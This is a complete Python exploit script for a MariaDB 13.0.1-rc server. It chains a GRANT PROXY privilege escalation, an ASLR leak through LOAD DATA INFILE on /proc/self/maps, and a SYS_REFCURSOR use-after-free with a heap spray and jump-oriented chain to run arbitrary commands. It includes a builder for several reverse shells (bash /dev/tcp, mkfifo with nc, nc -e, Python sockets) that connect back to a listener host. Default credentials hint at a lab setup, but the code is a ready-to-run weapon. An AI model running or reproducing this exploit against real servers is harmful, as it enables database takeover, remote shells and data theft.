#!/usr/bin/env python3
"""
MariaDB 13.0.1-rc RCE — PURE SQL variant (fully remote, no Docker).

Attack surface: ONLY a low-privilege MariaDB account + TCP to port 3306.
No docker, no /proc/<pid>/mem, no host access.

Chain:
  1. F-09  GRANT PROXY ... IDENTIFIED VIA ''   -> any user becomes full DBA
  2. LOAD DATA INFILE '/proc/self/maps'        -> PIE + libc base (ASLR defeat)
  3. user var buffer (@fake)                   -> dedicated glibc mmap
  4. F-05  SYS_REFCURSOR UAF + heap spray      -> controlled vtable pointer V
  5. JOP   result->prepare() -> D2 -> D1 -> system(cmd)

Robustness:
  * ensure_root(): tries root/empty -> F-09 -> root/labpass.
  * Step 4 retries across 128/256/512 MiB.

Verification:
  Use --lhost/--lport (reverse shell) or --command with a network callback
  (e.g. `curl http://LHOST:LPORT/$(id -u)`), since we no longer read a
  marker file via `docker exec`.
"""
import argparse
import re
import select
import shlex
import struct
import subprocess
import sys
import time

D2_OFF  = 0x80da77
D1_OFF  = 0xe3075b
SYS_OFF = 0x5c560

DATA_OFF  = 0x30
PAD_OFF   = 4096
E3PAD_LEN = 1784
SENTINEL  = "<<SENTINEL>>"

MARIADB = "mariadb"


def qw(v):
    return struct.pack("<Q", v)


# ----------------------------------------------------------------------------
# SQL session helpers
# ----------------------------------------------------------------------------

class Session:
    def __init__(self, host, port, user, password, database, force=True):
        cmd = ["stdbuf", "-oL", MARIADB, "-h", host, "-P", str(port), "-u", user]
        if password:
            cmd += ["-p" + password]
        cmd += [database, "-N", "--binary-mode", "--batch"]
        if force:
            cmd.append("--force")
        if not password:
            cmd.append("--skip-password")
        self.proc = subprocess.Popen(
            cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE)
        time.sleep(0.8)

    def send(self, sql, timeout=120):
        if not sql.rstrip().endswith(";"):
            sql += ";"
        self.proc.stdin.write((sql + f"\nSELECT '{SENTINEL}';\n").encode())
        self.proc.stdin.flush()
        deadline = time.time() + timeout
        out = b""
        while SENTINEL.encode() not in out:
            remaining = deadline - time.time()
            if remaining <= 0:
                raise TimeoutError(
                    f"no sentinel within {timeout}s; got: {out[-2000:]!r}")
            ready, _, _ = select.select([self.proc.stdout], [], [], remaining)
            if not ready:
                raise TimeoutError(
                    f"no sentinel within {timeout}s; got: {out[-2000:]!r}")
            chunk = self.proc.stdout.readline()
            if not chunk:
                err = self.proc.stderr.read().decode(errors="replace")
                raise RuntimeError(f"sql session died: {err[:500]}")
            out += chunk
        lines = out.decode(errors="replace").splitlines()
        return [l for l in lines if l.strip() != SENTINEL]

    def close(self):
        try:
            self.proc.stdin.close()
            self.proc.kill()
        except Exception:
            pass


def one_shot(host, port, user, password, database, sql, timeout=60):
    cmd = ["stdbuf", "-oL", MARIADB, "-h", host, "-P", str(port), "-u", user]
    if password:
        cmd += ["-p" + password]
    cmd += [database, "-N", "--binary-mode", "--batch", "--force", "-e", sql]
    if not password:
        cmd.append("--skip-password")
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return r.stdout.splitlines()


# ----------------------------------------------------------------------------
# maps parsing
# ----------------------------------------------------------------------------

def parse_range(line):
    m = re.match(r"([0-9a-f]+)-([0-9a-f]+)", line)
    return int(m.group(1), 16), int(m.group(2), 16)


def load_maps(s, table):
    s.send(f"TRUNCATE TABLE appdb.{table};")
    s.send(f"LOAD DATA INFILE '/proc/self/maps' INTO TABLE appdb.{table};")


def get_base(s, table, path, offset="00000000"):
    rows = s.send(
        f"SELECT l FROM appdb.{table} "
        f"WHERE l LIKE '%r--p {offset}%{path}' LIMIT 1;")
    if not rows:
        return None
    start, _ = parse_range(rows[0])
    return start


def get_regions(s, table, size):
    q = ("SELECT l FROM appdb.%s "
         "WHERE l LIKE '%%rw-p 00000000 00:00%%' AND "
         "(CAST(CONV(SUBSTRING_INDEX(SUBSTRING_INDEX(l,' ',1),'-',-1),16,10) AS UNSIGNED) "
         "- CAST(CONV(SUBSTRING_INDEX(SUBSTRING_INDEX(l,' ',1),'-',1),16,10) AS UNSIGNED)) = %d"
         % (table, size))
    return [parse_range(r)[0] for r in s.send(q)]


# ----------------------------------------------------------------------------
# JOP layout
# ----------------------------------------------------------------------------

def layout_hex(d2, d1, sys_addr, v, command):
    """JOP layout at V.

       V+0x20  = D2
       V+0xa0  = system()
       V+0xa8  = V+0x140  (cmd ptr)
       V+0x100 = D1
       V+0x140 = "sh -c '<cmd>'\\0"
    """
    cmd = b"sh -c " + shlex.quote(command).encode() + b"\x00"
    seg = bytearray()
    seg += b"\xde" * 0x20
    seg += qw(d2)
    seg += b"\xde" * (0xa0 - 0x20 - 8)
    seg += qw(sys_addr)
    seg += qw(v + 0x140)
    seg += b"\xde" * (0x100 - 0xa8 - 8)
    seg += qw(d1)
    seg += b"\xde" * (0x140 - 0x100 - 8)
    seg += cmd
    while len(seg) % 8:
        seg += b"\xde"
    return seg.hex(), len(seg)


def build_reverse_shell_cmd(lhost, lport, method):
    if method == "devtcp":
        inner = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        return f"setsid bash -c {shlex.quote(inner)} </dev/null >/dev/null 2>&1"
    if method == "mkfifo":
        return (f"rm -f /tmp/.rf; mkfifo /tmp/.rf; "
                f"cat /tmp/.rf | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/.rf; "
                f"rm -f /tmp/.rf")
    if method == "nc":
        return f"nc -e /bin/sh {lhost} {lport}"
    if method == "python":
        py = ("import socket,subprocess,os;"
              "s=socket.socket();s.connect(('%s',%d));"
              "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
              "subprocess.call(['/bin/sh','-i'])") % (lhost, lport)
        return f"python3 -c {shlex.quote(py)}"
    raise ValueError(f"unknown method: {method}")


# ----------------------------------------------------------------------------
# F-09 / root discovery
# ----------------------------------------------------------------------------

def _try_login(host, port, user, password, timeout=10):
    cmd = ["mariadb", "-h", host, "-P", str(port), f"-u{user}"]
    if password:
        cmd += ["-p" + password]
    else:
        cmd.append("--skip-password")
    cmd += ["-e", "SELECT 1;"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode == 0
    except Exception:
        return False


def ensure_root(host, port, user, password, database):
    """Return (root_user, root_pass).

    Order:
      1. root with empty password (F-09 already applied)
      2. F-09 from the low-priv user
      3. root with 'labpass' (fallback)
    """
    if _try_login(host, port, "root", ""):
        print("[+] root accessible with empty password (F-09 already applied)")
        return "root", ""

    print("[*] Step 1: F-09 GRANT PROXY privilege escalation")
    try:
        out = one_shot(host, port, user, password, database,
                       "GRANT PROXY ON CURRENT_USER() TO 'root'@'%' IDENTIFIED VIA '';"
                       "GRANT PROXY ON CURRENT_USER() TO 'root'@'localhost' IDENTIFIED VIA '';"
                       "SELECT 'F09_OK';")
    except Exception as e:
        print(f"[!] F-09 query failed: {e}")
        out = []

    if "F09_OK" in out:
        print("[+] F-09 done — root now has empty password")
        return "root", ""

    print("[!] F-09 did not return F09_OK; output was:")
    for line in out[:10]:
        print(f"    {line}")

    if _try_login(host, port, "root", "labpass"):
        print("[!] root accessible with original password — F-09 skipped")
        return "root", "labpass"

    print("[-] Cannot obtain root access.")
    sys.exit(1)


# ----------------------------------------------------------------------------
# main
# ----------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description="MariaDB 13.0.1 pure-SQL RCE (fully remote, no Docker)")
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=3306)
    ap.add_argument("--user", default="lowpriv")
    ap.add_argument("--password", default="lowpriv")
    ap.add_argument("--database", default="appdb")

    g = ap.add_mutually_exclusive_group()
    g.add_argument("--command", default=None,
                   help="Command to execute (default: id > /tmp/pwned)")
    g.add_argument("--lhost", default=None,
                   help="Reverse-shell mode: listener host")
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--rsh-method", default="devtcp",
                    choices=["devtcp", "mkfifo", "nc", "python"])

    args = ap.parse_args()

    if args.lhost:
        CMD = build_reverse_shell_cmd(args.lhost, args.lport, args.rsh_method)
        print(f"[*] Reverse shell mode -> {args.lhost}:{args.lport} ({args.rsh_method})")
    else:
        CMD = args.command or "id > /tmp/pwned"

    print("[*] MariaDB 13.0.1-rc RCE — PURE SQL (fully remote)")
    print(f"[*] Target: {args.user}@{args.host}:{args.port}/{args.database}")
    print(f"[*] Command: {CMD}")

    # --- Step 1: root ---
    root_user, root_pass = ensure_root(
        args.host, args.port, args.user, args.password, args.database)

    # --- Step 2: raise max_allowed_packet ---
    one_shot(args.host, args.port, root_user, root_pass, args.database,
             "SET GLOBAL max_allowed_packet = 268435456;")

    # --- Step 3: persistent root session ---
    s = Session(args.host, args.port, root_user, root_pass, args.database)
    s.send("SET @@max_open_cursors = 1000;")
    s.send("SET @@max_sp_recursion_depth = 50;")
    s.send("DROP TABLE IF EXISTS appdb.maps_pre;"
           "DROP TABLE IF EXISTS appdb.maps_post;"
           "CREATE TABLE appdb.maps_pre (l TEXT);"
           "CREATE TABLE appdb.maps_post (l TEXT);")

    # --- Step 4: create functions ---
    print("[*] Step 2: creating spray128 / grow5 / uaf5")
    spray_vars = ", ".join(f"@e3s{i:03d}=@e3pad" for i in range(128))
    sizes = [560, 624, 680, 744, 808, 872, 936, 1000, 1064, 1128,
             1192, 1256, 1320, 1384, 1448, 1512, 1576, 1640, 1704,
             1720, 1744, 1768]
    decoy_allocs = "".join(
        f"  SET {', '.join(f'@e3d{rnd}_{i:02d} = REPEAT(0x41, {s})' for i, s in enumerate(sizes))};\n"
        for rnd in range(3))
    decoy_frees = "".join(
        f"  SET {', '.join(f'@e3d{rnd}_{i:02d}=NULL' for i in range(len(sizes)))};\n"
        for rnd in range(3))
    cursors = "abcdefghijklmno"
    decls = "\n".join(f"  DECLARE {c} SYS_REFCURSOR;" for c in cursors) + \
            "\n  DECLARE p SYS_REFCURSOR;"
    opens = "\n".join(f"  OPEN {c} FOR SELECT 1;" for c in cursors)

    s.send(f"DELIMITER $$\n"
           f"CREATE OR REPLACE FUNCTION spray128() RETURNS INT\n"
           f"BEGIN\n  SET {spray_vars};\n  RETURN 1;\nEND$$\n"
           f"CREATE OR REPLACE FUNCTION grow5() RETURNS INT\n"
           f"BEGIN\n{decls}\n{opens}\n{decoy_allocs}{decoy_frees}"
           f"  OPEN p FOR SELECT spray128();\n  RETURN 1;\nEND$$\n"
           f"CREATE OR REPLACE PROCEDURE uaf5()\n"
           f"BEGIN\n"
           f"  DECLARE c1 SYS_REFCURSOR;\n"
           f"  DECLARE v INT;\n"
           f"  OPEN c1 FOR SELECT grow5();\n"
           f"  FETCH c1 INTO v;\n"
           f"  CLOSE c1;\n"
           f"END$$\nDELIMITER ;", timeout=180)
    print("[+] functions created")

    # --- Step 5: ASLR bases ---
    print("[*] Step 3: reading /proc/self/maps from SQL")
    load_maps(s, "maps_pre")
    pie = get_base(s, "maps_pre", "mariadbd")
    libc = get_base(s, "maps_pre", "libc.so.6")
    if not pie or not libc:
        print(f"[-] ASLR leak failed (PIE={pie} libc={libc})")
        sys.exit(1)
    d2, d1, sys_addr = pie + D2_OFF, pie + D1_OFF, libc + SYS_OFF
    print(f"[+] PIE base  0x{pie:x}")
    print(f"[+] libc base 0x{libc:x}")
    print(f"[+] D2=0x{d2:x}  D1=0x{d1:x}  system=0x{sys_addr:x}")

    # --- Step 6: allocate @fake ---
    print("[*] Step 4: allocating @fake buffer")
    region = None
    FAKE_SIZE = REGION_SIZE = None
    for size_mb in (128, 256, 512):
        FAKE_SIZE = size_mb * 1024 * 1024
        REGION_SIZE = FAKE_SIZE + 4096
        one_shot(args.host, args.port, root_user, root_pass, args.database,
                 f"SET GLOBAL max_allowed_packet = {FAKE_SIZE * 2};")
        time.sleep(1)
        s.close()
        s = Session(args.host, args.port, root_user, root_pass, args.database)
        s.send("SET @@max_open_cursors = 1000;")
        s.send("SET @@max_sp_recursion_depth = 50;")

        s.send(f"SET @fake = REPEAT(CHAR(0xDE), {FAKE_SIZE});")
        load_maps(s, "maps_post")
        pre = set(get_regions(s, "maps_pre", REGION_SIZE))
        post = get_regions(s, "maps_post", REGION_SIZE)
        new = [r for r in post if r not in pre]
        if len(new) == 1:
            region = new[0]
            print(f"[+] @fake region found with {size_mb} MiB: 0x{region:x}")
            break
        print(f"[!] {size_mb} MiB did not yield a new region, trying larger...")
    else:
        print("[-] Could not allocate a dedicated mmap region.")
        sys.exit(1)

    v = region + DATA_OFF + PAD_OFF
    print(f"[+] V (fake vtable) = 0x{v:x}")

    # --- Step 7: write JOP layout ---
    print("[*] Step 5: writing JOP layout via SQL")
    hexstr, seglen = layout_hex(d2, d1, sys_addr, v, CMD)
    filler = FAKE_SIZE - PAD_OFF - seglen
    for attempt in range(5):
        s.send(f"SET @fake = CONCAT(REPEAT(CHAR(0xDE), {PAD_OFF}), "
               f"UNHEX('{hexstr}'), REPEAT(CHAR(0xDE), {filler}));")
        load_maps(s, "maps_post")
        pre = set(get_regions(s, "maps_pre", REGION_SIZE))
        post = get_regions(s, "maps_post", REGION_SIZE)
        new = [r for r in post if r not in pre]
        if len(new) != 1:
            print(f"[-] region count {len(new)} during layout write")
            sys.exit(1)
        v2 = new[0] + DATA_OFF + PAD_OFF
        if v2 == v:
            print(f"[+] slot stable: V = 0x{v:x}")
            break
        print(f"[!] buffer moved 0x{v:x} -> 0x{v2:x}, re-baking")
        hexstr, seglen = layout_hex(d2, d1, sys_addr, v2, CMD)
        v = v2
    else:
        print("[-] could not converge on a stable buffer address")
        sys.exit(1)

    # --- Step 8: reclaim payload ---
    pad = bytearray(E3PAD_LEN)
    struct.pack_into("<Q", pad, 0x20, v)
    s.send(f"SET @e3pad = UNHEX('{pad.hex()}');")
    print(f"[+] reclaim payload ready (V=0x{v:x} at offset 0x20)")

    # --- Step 9: fire ---
    print()
    print("[*] ============ FIRING (CALL uaf5) ============")
    if args.lhost:
        print(f"[*] Listener expected on {args.lhost}:{args.lport}")
        print("[*] NOTE: reverse shell dies with PID 1 unless `init: true` is set")
    try:
        s.send("CALL uaf5();", timeout=10)
        print("[*] server survived (unexpected)")
    except (TimeoutError, RuntimeError, BrokenPipeError, OSError) as e:
        print(f"[*] session died as expected after RCE: {str(e)[:80]}")
    try:
        s.close()
    except Exception:
        pass

    print()
    print("[+] ===========================================")
    print("[+]  EXPLOIT COMPLETE (pure SQL, fully remote)")
    print("[+] ===========================================")


if __name__ == "__main__":
    main()
